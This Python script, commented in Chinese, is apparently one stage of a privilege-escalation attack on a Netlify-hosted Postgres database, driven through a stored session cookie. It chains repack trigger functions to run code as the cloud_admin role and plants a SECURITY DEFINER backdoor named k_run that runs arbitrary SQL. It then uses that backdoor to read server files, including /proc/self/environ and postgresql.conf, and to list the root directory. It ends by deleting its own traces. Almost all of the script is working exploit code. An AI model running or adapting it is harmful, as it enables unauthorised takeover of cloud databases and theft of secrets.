# -*- coding: utf-8 -*-
"""波23:提权链收尾 + cloud_admin 后门利用
C1 清理波22 残留(依赖顺序)
C2 重建链 + evil 在 cloud_admin 上下文创建 SECURITY DEFINER 后门 k_run
C3 验证 k_run 以 cloud_admin 执行
C4 文件读 PoC:绝对路径 / proc 环境 / 文件系统布局
C5 重放链清理 k_run/k_pwned + 自清理
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:9000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# C1: 清理波22 残留(按依赖:先 trigger/函数,再 log 表,再 type,再 k_src;k_pwned 归 cloud_admin 需提权链删)
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_25128",
               "drop function if exists public.k_evil()",
               "drop table if exists repack.log_25128",
               "drop type if exists repack.pk_25128",
               "drop table if exists k_src"])
print('C1_cleanup       [%d] %.1fs' % (s, dt))
print('   ' + b[:600])
print()

# C2: 重建链 + 埋后门 k_run(owner=cloud_admin, security definer)
evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
        "  begin execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; exception when others then null; end; "
        "  begin execute $f$create or replace function public.k_run(q text) returns setof text language plpgsql security definer as $z$ "
        "begin "
        "  begin "
        "    return query execute q; "
        "  exception when others then "
        "    execute q; "
        "    return query select 'OK'; "
        "  end; "
        "end $z$$f$; exception when others then null; end; "
        "  return new; "
        "end $q$")
s, b, dt = tx(["drop table if exists k_src",
               "create table k_src(id int, v text)",
               "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
print('C2_src           [%d] %.1fs' % (s, dt))
print('   ' + b[:800])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('   -> oid =', oid)
if not oid:
    sys.exit('C2 未解析 oid')

s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
               "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
print('C2b_mktype_log   [%d] %.1fs' % (s, dt))
print('   ' + b[:600])

s, b, dt = tx(["drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop trigger if exists k_src_trg on k_src",
               evil,
               "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (1, 'hello')"])
print('C2c_chain        [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
print()

# C3: 验证 k_run(后门)执行上下文
s, b, dt = tx(["select * from public.k_run('select current_user::text')",
               "select * from public.k_run('select rolsuper from pg_roles where rolname=current_user')"])
print('C3_krun_verify   [%d] %.1fs' % (s, dt))
print('   ' + b[:1200])
print()

# C4: 文件读 PoC(每个独立 tx,错误可见)
s, b, dt = tx(["select * from public.k_run('select pg_read_file(''postgresql.conf'')')"])
print('C4a_rd_datadir   [%d] %.1fs' % (s, dt))
print('   ' + b[:2000])
print()

s, b, dt = tx(["select * from public.k_run('select pg_read_file(''/etc/hostname'')')"])
print('C4b_rd_abs       [%d] %.1fs' % (s, dt))
print('   ' + b[:800])
print()

s, b, dt = tx(["select * from public.k_run('select convert_from(pg_read_binary_file(''/proc/self/environ''),''UTF8'')')"])
print('C4c_rd_environ   [%d] %.1fs' % (s, dt))
print('   ' + b[:5000])
print()

s, b, dt = tx(["select * from public.k_run('select string_agg(x, chr(10)) from pg_ls_dir(''/'') x')"])
print('C4d_ls_root      [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
print()

# C5: 收尾 —— 重放链清理 cloud_admin 对象(k_pwned/k_run),再自清理
evil2 = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
         "begin "
         "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
         "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
         "  return new; "
         "end $q$")
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               evil2,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (2, 'cleanup')"])
print('C5a_drop_cloud   [%d] %.1fs' % (s, dt))
print('   ' + b[:800])

s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop function if exists public.k_evil()",
               "drop table if exists repack.log_%s" % oid,
               "drop type if exists repack.pk_%s" % oid,
               "drop table if exists k_src"])
print('C5b_self_cleanup [%d] %.1fs' % (s, dt))
print('   ' + b[:600])
